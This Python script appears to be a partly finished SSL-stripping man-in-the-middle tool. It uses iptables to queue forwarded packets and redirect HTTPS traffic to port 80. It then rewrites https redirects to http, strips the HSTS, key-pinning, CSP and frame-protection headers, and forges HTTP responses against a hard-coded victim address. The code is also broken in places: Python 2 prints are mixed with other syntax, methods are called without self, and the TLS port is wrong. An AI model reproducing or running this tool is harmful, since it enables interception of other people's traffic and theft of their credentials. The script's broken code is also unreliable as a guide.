from scapy.all import *
from netfilterqueue import NetfilterQueue
from scapy.layers import http
from scapy.layers.http import *
import scapy
from scapy import *
from scapy.all import *
#from scapy.layers.ssl_tls import *
import os
import threading
import cryptography    #required for tls version needs to be >= 1.7 and < 42.0.0

load_layer("tls")    #enables tls for the https connection with the server
load_layer("http")    #also useful, possibly redundant

class SslRemover():

    def __init__(self, ip_victim, queue_num):

        self.queue         = NetfilterQueue()
        self.iprule_add    = "iptables -A FORWARD -j NFQUEUE --queue-num {}".format(queue_num)
        self.iprule2_add    = "iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 80"
        self.iprule_remove = "iptables -D FORWARD -j NFQUEUE --queue-num {}".format(queue_num)
        self.iprule2_remove = "iptables -t nat -D PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 80"
        self.thread        = threading.Thread(name="ssl-remover-{}".format(queue_num), target=self.queue.run)
        self.thread.setDaemon(True)
        self.connected_tls = False

        self.queue.bind(queue_num, self.handle_packet)

    def start_tls_automaton(self, url):
        self.connection = TLSClientAutomaton.tlsink(HTTP, server=url, dport=500)
        #pkt = a.sr1(HTTP()/HTTPRequest(), session=TCPSession(app=True), timeout=2)
        self.connected_tls = True

    def close_tls_automaton(self):
        self.connection.close_session()
        self.connected_tls = False

    def send_and_receive_https(self, pkt):
        self.connection.send(pkt)
        self.handle_packet(self.connection.recv())  
    

    def handle_packet(self, packet_nfqueue):
        packet_scapy = IP(packet_nfqueue.get_payload())

        if packet_scapy.haslayer(HTTPResponse):
            print packet_scapy.show()
            packet_scapy[HTTPResponse].Location = (packet_scapy[HTTPResponse].Location).replace("https://", "http://")
            print packet_scapy[HTTPResponse].Location
            del packet_scapy[HTTPResponse].Strict_Transport_Security
            del packet_scapy[HTTPResponse].Public_Key_Pins
            del packet_scapy[HTTPResponse].Content_Security_Policy
            del packet_scapy[HTTPResponse].X_XSS_Protection
            del packet_scapy[HTTPResponse].X_Frame_Options

            packet_nfqueue.set_payload(bytes(packet_scapy))
            return packet_nfqueue.accept()


        if packet_scapy.haslayer(HTTPRequest):
            http_layer = packet_scapy[HTTPRequest]
            ip_layer = packet_scapy[IP]

            print "HTTP Request to {}{}".format(http_layer.Host.decode(), http_layer.Path.decode())
            

            new_packet = IP(src=ip_layer.src, dst=ip_layer.dst) / \
                         TCP(sport=packet_scapy[TCP].sport, dport=packet_scapy[TCP].dport, flags="PA") / \
                         HTTPRequest(
                             Method=http_layer.Method,
                             Host=http_layer.Host,
                             Path=http_layer.Path,
                             User_Agent=http_layer.User_Agent,
                             Accept=http_layer.Accept,
                             Accept_Language=http_layer.Accept_Language,
                             Accept_Encoding=http_layer.Accept_Encoding,
                             Connection=b'close'
                         )
            #send(new_packet)
            print "Request packet made"

             # Create a fake HTTP response
            response_packet = IP(src=ip_layer.dst, dst=ip_layer.src) / \
                              TCP(sport=packet_scapy[TCP].dport, dport=packet_scapy[TCP].sport, flags="PA") / \
                              HTTPResponse(
                                  Content_Type=b"text/html",
                                  Content_Length=str(len([0,1,2])),
                                  Server=b"FakeServer"
                              )
    
            # Send the fake response
            #send(response_packet)
            print "Response packet made"

            if not self.connected_tls:
                start_tls_automaton(ip_layer.dst)
                
            send_and_receive_https(packet_nfqueue)
            return True    #placeholder to exit function
            
        return packet_nfqueue.accept()

    def start(self):

        os.system(self.iprule_add)    #make sure SSL ssling
        os.system(self.iprule2_add)    #make sure SSL ssling
        self.thread.start()    #queue starts accepting packages

        print "SSL stripping started"

    def stop(self):

        os.system(self.iprule_remove)    #make sure SSL nbot ssling
        os.system(self.iprule2_remove)    #make sure SSL nbot ssling
        self.queue.unbind()    #delete queue

        print "SSL stripping stopped"

if __name__ == "__main__":
    ip_victim = "10.0.123.5"
    ssl_remover = SslRemover(ip_victim, 2)
    ssl_remover.start()
    time.sleep(20)
    ssl_remover.stop()